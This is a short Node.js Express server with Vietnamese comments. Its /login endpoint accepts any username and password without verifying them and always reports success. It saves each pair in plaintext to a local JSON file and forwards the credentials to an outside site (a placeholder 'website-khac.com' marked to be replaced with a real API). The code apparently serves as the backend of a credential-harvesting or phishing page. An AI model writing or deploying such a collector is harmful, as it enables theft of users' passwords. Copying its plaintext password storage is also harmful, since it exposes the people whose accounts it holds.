const express = require('express');
const fs = require('fs');
const fetch = require('node-fetch'); // npm install node-fetch
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve file HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// API nhận login từ client
app.post('/login', async (req, res) => {
  const { taikhoan, matkhau } = req.body;
  if (!taikhoan || !matkhau) return res.json({ status: 'error', message: 'Thiếu tài khoản hoặc mật khẩu' });

  // 1️⃣ Lưu vào file JSON local
  let users = [];
  if (fs.existsSync('users.json')) {
    users = JSON.parse(fs.readFileSync('users.json', 'utf8'));
  }
  users.push({ taikhoan, matkhau });
  fs.writeFileSync('users.json', JSON.stringify(users, null, 2));

  // 2️⃣ Gửi sang website thứ 2 (giả lập API)
  try {
    const response = await fetch('https://website-khac.com/api/save', { // Thay bằng API thật
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ taikhoan, matkhau })
    });
    const data = await response.json();
    console.log('Gửi sang website khác:', data);
  } catch (err) {
    console.log('Lỗi gửi sang website khác (giả lập):', err.message);
  }

  // 3️⃣ Trả về client
  res.json({ status: 'success', message: `Xin chào, ${taikhoan}` });
});

// Start server
app.listen(3000, () => console.log('Server chạy tại http://localhost:3000'));
